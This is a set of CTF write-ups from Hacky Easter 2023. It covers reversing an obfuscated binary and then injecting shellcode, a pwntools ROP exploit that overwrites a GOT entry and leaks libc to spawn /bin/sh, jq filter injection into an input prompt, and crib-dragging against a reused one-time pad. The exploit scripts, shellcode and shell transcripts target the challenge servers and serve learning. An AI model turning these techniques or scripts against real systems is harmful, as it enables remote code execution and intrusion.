@@ -1,0 +1,584 @@
+= [HE22.33] This one goes to 11
+image::level8/challenge33.jpg[,300,float="right"]
+
+== Intro
+So tell me, how do I escape hell, wise man?
+
+Connect to the server.
+
+  nc ch.hackyeaster.com 2309
+
+Note: The service is restarted every hour at x:00.
+
+File: `hint`
+
+=== Hint
+Non est facilis labor fugere infernum, quia est fundamentum omnis mali ac
+nequitiarum. Solum ultima tua clamor te liberabit ex hoc loco. Sed ante te
+volvendus campis ad sinistram et ad dexteram et evadendus insidias mali Xorxis.
+Sed ne putes id facile fore, qui victoriam quaerit, oportet ei mentem habere
+quid in hoc labore vero est momenti.
+
+== Solution
+First thought: somebody has a too weird sense for music -- at least it was not
+_Break like the wind_ or _Big bottoms_!
+
+Back to the challenge: we are given a Linux executable, printing a nice banner
+and expecting an input. Decompiling and analysing the file in Ghidra shows a
+mess of jump statements or many nested `while` and `do .. while` loops.  The
+unprocessed main function has more than 1000 lines.
+
+Analysing the C-code a bit, it turns out that the code does have some
+structure, it looks like a state machine from hell, obfuscated with some
+superfluous constructs having no effect:
+
+* there is a variable holding the state, typically `eax` or `iVar4`
+* coming from the innermost loop, we see that it is coded as a `while (eax ==
+  0x12345678) { ... ; eax = 0x23456781; }`.  So this loop can be changed to a
+  simple `if` statement.
+* there are `while(true)` loops that have a `if (eax != ...) break;` towards
+  the end.  Between the `break` and the end of the loop is one step of the
+  state machine.
+* there are `while(true)` loops with a `if (eax == ...) break;`.  These can be
+  changed to `while(eax ==...)`
+* following these `break` statements follow `if (eax < ...) {` blocks that just
+  guard nested `if (eax == ...) {` blocks.  These `if (eax < ...) {` can be
+  eliminated completely.
+* ```do .. while (0x5eda4e7a < eax);``` loops where the ending condition holds only
+  within the loop.  The code follwing the `while` condition can be turned into
+  an `if` block with the negated condition.
+
+* some assignment statements of the form 
+    ```eax = (-(uint)((local_228 & 1) != 0 &&
+      9 < DAT_00108838) & 0xe3d46c4b)
+      + 0x67f9bce3;````
+  The local variable is always a multiple of two, so the whole expression can
+  be reduced to `eax = ...`
+* Finally, there are statements of the form
+   `iVar4 = (-(uint)((ulong)local_1e6 < (long)eax - 4U) & 0x1fb155e1) +
+   0x4b069874;` These are `if .. then .. else` statements thatneed to be
+   calculated for both code paths.
+
+Making these modifications was first attempted by hand, but quickly dismissed as
+too error prone.  After some thought, the `tree-sitter` library was used and
+the resulting AST could then be massaged quite comfortably.   One exemplary
+function and the main driver are given here:
+
+[source,python]
+----
+def replace_else(src, lines):    
+    parser = Parser()
+    parser.set_language(C_LANGUAGE)
+    tree = parser.parse(src)
+    for node in walk(tree):
+        if node.type == 'if_statement':
+            if alt := node.child_by_field_name('alternative'):
+                else_s = node.children[3]
+                start, end = else_s.start_point, alt.end_point
+                lines[start[0]] = f'{lines[start[0]][:start[1]]}{lines[start[0]][else_s.end_point[1]:]}'
+    return lines
+
+
+if __name__ == '__main__':
+    print(sys.argv)
+    if len(sys.argv) < 2:
+        print(f'usage: {sys.argv[0]} prog.c')
+    else:
+        with open(sys.argv[1], 'rb') as inF:
+            src = inF.read()
+            lines = bytes2lines(src)
+
+        lines = replace_while_binary(src, lines)
+        
+        neu = ''.join(f'{l}\n' for l in lines)
+        lines = replace_else(neu.encode('utf8'), lines)
+
+        neu = ''.join(f'{l}\n' for l in lines)
+        lines = replace_do_while(neu.encode('utf8'), lines)
+
+        neu = ''.join(f'{l}\n' for l in lines)
+        lines = replace_while_break(neu.encode('utf8'), lines)
+
+        neu = ''.join(f'{l}\n' for l in lines)
+        lines = replace_if_lt(neu.encode('utf8'), lines)
+
+        neu = ''.join(f'{l}\n' for l in lines)
+        with open('new.c', 'w') as outF:
+            outF.write(neu)
+
+----
+
+Parsing the code this way ensured that the overall flow stayed intact,
+especially finding the matching `while` to a `do` or the matching `break` for a
+`while(true)` loop can be very tricky otherwise.  
+
+
+Such simplified
+code was then analysed by hand.  The code consists of several blocks beginning
+with an unconditional `iVar4 = ...` statement.  From this statement, the
+ordering of the flow through the state machine can be derived quite easily.
+Typically, such a block contained quite a few not reachable states.  The
+resulting simplified code was then re-engineered in python and has this simple
+structure:
+
+[source, python]
+----
+def process(b):
+    add(b, -0xd)
+    ror_base64(b, 0x15)
+    bin_data = decode(b)
+    ror(bin_data, 0x19)
+    neg(bin_data)
+    xor_code(bin_data)
+    return bin_data
+----
+
+The whole processing of the input `b` does a subtraction on each byte, then a
+rotation right of the data is done (4 bytes concatenated and interpreted as in
+`int`).  Then something simplar to base64 decoding is done followed again by a
+rotation and a bitwise negation.  The result is then `xor`-ed with a constant
+byte-vector.  This `bin_data` is then executed, of course the region was made
+executable before.
+
+Since we can execute the result of `process(b)` and we control the input, we
+can craft an input to give us a shell.  Reversing `process(b)` is possible, but
+took time to verify against the c-code from Ghidra.  Shellcodes are readily
+available at e.g https://www.exploit-db.com/shellcodes.  Several were tried and
+https://www.exploit-db.com/shellcodes/41183 was working out of the box.
+
+So the shellcode was sent through the reverse `process(b)` and the resulting input was used in a `pwnlib` attack script.
+
+[source, python]
+----
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Full RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      PIE enabled
+
+io = start()
+
+shellcode = b"'\xc0\xa6`\xc8vG\xb8\x8fH\xd8\xd6\xaf\xdf\xb7OH\xa7'H_\x88~G&O\xd8\x88f7\x97\xaf\xaf\xb6\x16x`HOG_\x88\xbf\x8e\xcfX\xd0'\x90\xd0\xb6\xaf?\xc0\xd0n\xd8\x87\xbeh"                                                                                                                                                                            
+io.recvuntil(b'=\n')
+io.send(shellcode + b'\r')
+io.interactive()
+----
+
+Running this attack gives us a shell on the server and we find the flag at
+
+    [+] Opening connection to ch.hackyeaster.com on port 2309: Done
+    [*] Switching to interactive mode
+    $ 
+    $ ls
+    hell
+    ynetd
+    $ cd /
+    $ ls f*
+    fl@gst0r3
+    $ cd fl@gst0r3
+    $ ls
+    flag
+    $ cat flag
+    he2023{th1s_1s_SP1N4l_t4P!!}$  
+
+Yes, it was Spinal Tap!  What a ride!
+
+= [HE22.35] Thumper's PWN - Ring 1
+image::level8/challenge34.jpg[,300,float="right"]
+
+== Intro
+Thumper has finally reached the innermost ring. He's given one last task to
+complete. You need to get a passing average to get the flag.
+
+Target: `nc ch.hackyeaster.com 2315``
+
+Note: The service is restarted every hour at x:00.
+
+File: `thumperspwn1.zip`
+
+== Solution
+The executable given is again for Linux and the C-code can be extracted using Ghidra
+
+[source, c]
+----
+#include <stdio.h>
+#include <stdlib.h>
+
+void read_ints(long *arr,int max_input)
+{
+  int nNum;
+  int i;
+  
+  for (i = 0; i <= max_input; i = i + 1) {
+    nNum = scanf("%lld",arr + i);
+    if (nNum != 1) {
+                    /* WARNING: Subroutine does not return */
+      exit(-1);
+    }
+    if (arr[i] == 0) break;
+  }
+  return;
+}
+
+int norm(long *arr,long *result)
+{
+  int i;
+  
+  *result = 0;
+  for (i = 0; arr[i] != 0; i = i + 1) {
+    *result = *result + arr[i];
+  }
+  *result = *result / (long)i;
+  return i;
+}
+
+
+void main(void)
+{
+  int iVar1;
+  long arr[5];
+  long *avg_ptr;
+  long average;
+  
+  arr[0] = 0;
+  arr[1] = 0;
+  arr[2] = 0;
+  arr[3] = 0;
+  arr[4] = 0;
+  average = 0;
+  avg_ptr = &average;
+  puts("Give me a list of integers and I calculate the average");
+  puts("0 is interpreted as the end of the input");
+  read_ints(arr,5);
+  iVar1 = norm(arr,avg_ptr);
+  if (5 < iVar1) {
+                    /* WARNING: Subroutine does not return */
+    exit(-1);
+  }
+  printf("%lld\n",average);
+  return;
+}
+----
+
+Things to notice:
+
+* in `main` there is an array defined, starting at `arr_5` that has room for 5
+  values, followed by another value, `avg_ptr`, and followed by another value
+  `average`.  As part of the initialization, `avg_ptr` is initialized to
+  `average`.  When calling `norm`, `avg_ptr` is passed to hold the result.
+* in `read_ints` at maximum of 5 values should be read, but the loop conditions
+  are such that 6 value can be read.  Effectively, `avg_ptr` is overwritten and
+  does not point at `average` anymore
+* in `norm` the average of arr[0..5] is written to where `avg_ptr` points at.  The
+  loop is set-up so that it just continues until a 0 is hit.  Fortunately, just
+  following `avg_ptr` is `average` and this one is initialized to 0.  So the we
+  should be calling 
+
+Effectively, we have a write-what-where gadget using `avp_ptr` that we can use
+to redirect `exit` to `main`.  This allows us to re-enter the program over and
+over again.  
+
+When calling `exit` the contents of `arr[0..5]` are still on the stack, just
+separated by the return address.  Using the `possibly_helpful_gadget` we can
+install a ROP-chaing to leak libc-addresses.  Using the leaked addresses we can
+infer the randomization offset and call a gadget for the win.
+
+Unfortunately, the ROP-chain leaks successfully, but fails afterwards during
+the next run in main.
+
+Some discussion led to the insight that there is a stack alignment issue and
+thus the attack has to be re-modelled slightly: instead of redirecting exit to
+main, it is redirected to the `pop rdi; ret` gadget and the address of main is
+placed in the first position of the array.  In this way we are jumping back to
+main.  Now to leak the libc-addresses, we need to insert another `ret` to align
+the stack.  This means that we cannot write a defined value to a defined
+address, but at least we control where to write.  Use 0x601000 as address to
+write to and build this ROP
+chain:
+
+  arr[0]: {ret}
+  arr[1]: {pop rdi; ret}
+  arr[2]: {puts_got}
+  arr[3]: {puts}
+  arr[4]: {main}
+  arr[5]: harmless address
+
+Now the ROP returns to main and doesn't crash and we can create another ROP
+chain to jump to a gadget. 
+
+[source,python]
+----
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template --host ch.hackyeaster.com --port 2315 ./main
+from pwn import *
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('./main')
+host = args.HOST or 'ch.hackyeaster.com'
+port = int(args.PORT or 2315)
+
+def start_local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Partial RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      No PIE (0x400000)
+
+def rop_inputs(target_addr, target_val, chain):
+    assert target_val < 0x3FFFFFFFFFFFFFFF
+    inputs = [0,0,0,0,0,0]
+    inputs[5] = target_addr
+    for i in range(len(chain)):
+        inputs[i] = chain[i]
+    tmp = (target_val * 6 - sum(inputs)) // (6 - len(chain))
+    for i in range(len(chain),4):
+        inputs[i] = tmp
+    inputs[4] = (target_val * 6 - sum(inputs)) 
+    assert (sum(inputs) // 6) == target_val
+    return inputs
+
+io = start()
+
+# some important constraints for ROP
+rop_ret = 0x400933
+rop_pop_rdi_ret = 0x400932
+rop_harmless = 0x601000
+
+# first redirect exit to call main again
+# but because of stack alignment issues, do it via 
+# 0x400932 (pop rdi; ret) and then leave 0x40094b 
+# in input[0]
+target_addr = exe.got['exit']
+target_val = rop_pop_rdi_ret
+inputs = rop_inputs(target_addr, target_val,[exe.symbols['main']])
+log.info(io.recvuntil(b'input\n').decode('ascii'))
+for v in inputs:
+    io.sendline(str(v).encode('ascii'))
+
+
+# define first rop to leak address of puts
+# because of stack alignment issues, we just send it to somewhere where it
+# cannot cause any harm
+chain=[rop_ret, rop_pop_rdi_ret,
+       exe.got['puts'], exe.symbols['puts'],
+       exe.symbols['main'], rop_harmless]
+
+log.info(io.recvuntil(b'input\n').decode('ascii'))
+for v in chain:
+    io.sendline(str(v).encode('ascii'))
+tmp = io.recvuntil(b"\n").rstrip()
+leaked_addr_puts_libc = u64(tmp.ljust(8, b"\x00")[:8])
+log.info(f'Leaked server\'s libc address, puts(): {leaked_addr_puts_libc:x}')
+
+if args.LOCAL:
+    """
+    root@hlzar❯ one_gadget /usr/lib/x86_64-linux-gnu/libc.so.6                           
+    0x4bfe0 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
+    constraints:
+      rsp & 0xf == 0
+      rcx == NULL
+      rbx == NULL || (u16)[rbx] == NULL
+
+    0xf2532 posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, [rsp+0xf0])
+    constraints:
+      [rsp+0x70] == NULL
+      [[rsp+0xf0]] == NULL || [rsp+0xf0] == NULL
+      [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0
+
+    0xf253a posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, r9)
+    constraints:
+      [rsp+0x70] == NULL
+      [r9] == NULL || r9 == NULL
+      [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0
+
+    0xf253f posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r9)
+    constraints:
+      [rsp+0x70] == NULL
+      [r9] == NULL || r9 == NULL
+      rdx == NULL || (s32)[rdx+0x4] <= 0
+    """
+    libc_path = '/usr/lib/x86_64-linux-gnu/libc.so.6'
+    gadget = 0x4bfe0
+    gadget = 0xf2532
+    gadget = 0xf253a
+else:
+    """
+    symbols from the remote libc (identified from leaked addresses):
+
+    root@hlzar❯ one_gadget ./libc6_2.27-3ubuntu1.6_amd64.so                              
+    0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
+    constraints:
+      rsp & 0xf == 0
+      rcx == NULL
+
+    0x4f302 execve("/bin/sh", rsp+0x40, environ)
+    constraints:
+      [rsp+0x40] == NULL
+
+    0x10a2fc execve("/bin/sh", rsp+0x70, environ)
+    constraints:
+      [rsp+0x70] == NULL
+    """
+    libc_path = './libc6_2.27-3ubuntu1.6_amd64.so'
+    gadget = 0x10a2fc
+    gadget = 0x4f2a5
+    gadget = 0x4f302
+
+libc = context.binary = ELF(libc_path)
+addr_puts = libc.symbols['puts']
+# addr_execve = libc.symbols['execve'] - addr_puts + leaked_addr_puts_libc
+addr_gadget = gadget - addr_puts + leaked_addr_puts_libc
+
+# now call execve from the ROP
+chain =[addr_gadget, 1, 1, 1, 1, rop_harmless]
+
+log.info(io.recvuntil(b'input\n').decode('ascii'))
+for v in chain:
+    print(v, hex(v), str(v).encode('ascii'))
+    io.sendline(str(v).encode('ascii'))
+io.interactive()
+----
+
+I cheated here by assuming that we use the same
+libc-version as in Ring-2 since it is running at the same host.  This second
+ROP does give us a shell and we can get the flag:
+
+  [*] Switching to interactive mode
+  $ cd challenge
+  $ ls
+  FLAG
+  main
+  $ cat FLAG
+  he2023{w3ll_d0ne_you_g0t_4_p4$$1ng_av3rag3_alth0ugh_w3_were_0ff_by_0n3}
+
+
+= [HE22.35] Jason
+image::level8/challenge35.jpg[,300,float="right"]
+
+== Intro
+Jason has implemented an information service.
+
+He has hidden a flag in it, can you find it?
+
+Connect to the server:
+
+  nc ch.hackyeaster.com 2304
+
+Note: The service is restarted every hour at x:00.
+
+== Solution
+The title of the challenge seems to indicate that we are dealing with JSON in
+one form or the other.  We are presented with a terminal (text) application
+that asks for an input and prints an answer.  There are several different
+cases:
+
+* if we enter one word of the category, we get the answer (`name` --> `Jason`)
+* if we enter another word, but not a key, we get `null` as the result
+* if we enter an incorrect character, we get `Invalid input`
+* if we enter something that is not forbidden, but triggers an error, we get
+  `Something went wrong`
+* there is also some time-out on the input that prints the `Something went
+  wrong` message
+
+After a lot of playing around, we find that `.` triggers `{` as an answer.
+This at least seems promising as the start of a JSON output, probably we are
+just given the first line of the output.  Searching for tools that could be
+used to process the input, `jq` seems a possible candidate and we can build up
+a command to list all the keys available.
+
+
+  > enter "name", "surname", "street", "city", "country", or "q" to quit
+  >  | keys[]
+  Result: "city"
+  
+  > enter "name", "surname", "street", "city", "country", or "q" to quit
+  >  | keys | @csv
+  Result: "\"city\",\"country\",\"covert\",\"name\",\"street\",\"surname\""
+  > enter "name", "surname", "street", "city", "country", or "q" to quit
+  > covert
+  Result: {
+  > enter "name", "surname", "street", "city", "country", or "q" to quit
+  > covert | keys | @csv
+  
+  > Result: "\"flag\""
+  > enter "name", "surname", "street", "city", "country", or "q" to quit
+  > covert.flag
+  Result: "he2023{gr3pp1n_d4_js0n_l1k3_4_pr0!}"
+  
+The output above has been cleaned up for some `Something went wrong` messages
+
+= [HE22.36] The Little Rabbit
+image::level8/challenge36.jpg[,300,float="right"]
+
+== Intro
+Oh no! Someone encrypted my poem, using a One-Time-Pad.
+
+Good news: Each line was encrypted individually, with the same key.
+
+Bad news: The plaintext was changed somehow, before encryption.
+
+== Solution
+The poem is encrypted using a One-Time-Pad, so it is probably xor'ed with the
+plaintext.  And since the same pad was used for all the lines, we can try a
+bootstrap approach: if we have a crib and we know the position of the crib,
+then in all the other lines at the same positions there must also be a sensible
+text.
+
+The poem was altered before encryption and from the title given in
+`cipher.txt`: "The Little Rabbit Ohaal" we can deduct that the poem was rot13
+treated before encryption.
+
+To start with, use the crib `` he2023{``, rot 13 it to `` ur2023{`` and scan
+all lines at all positions.  Print the ones where all four lines have text that
+contains only letters, numbers, or punctuation characters ` {}.,!_`.  This
+gives a nice start (use Cyber Chef to get the rot13 cribs):
+
+  b' ur2023{' pos: 11 ,ggyr Oha, ,nyy bs u, ,uvat va , , ur2023{, 
+  o' he2023{' cbf: 11 ,ttle Bun, ,all of h, ,hing in , , he2023{,
+  
+Now on to `ttle Bun` which must be ` little Bunny `and which in turn gives us
+fragments on the other lines to extend. Repeating this process we get inthe end
+the partially decoded poem:
+
+  I have a little Bunny with a coat as soft as down 
+  And nearly all of him is white except one bit of brown
+  The first thing in the morning when I get out of bed 
+  I wonder if he2023{cr1b_dr4ggin_4_pr0fit!} is the flag  
+  
+So the flag is ``he2023{cr1b_dr4ggin_4_pr0fit!}``
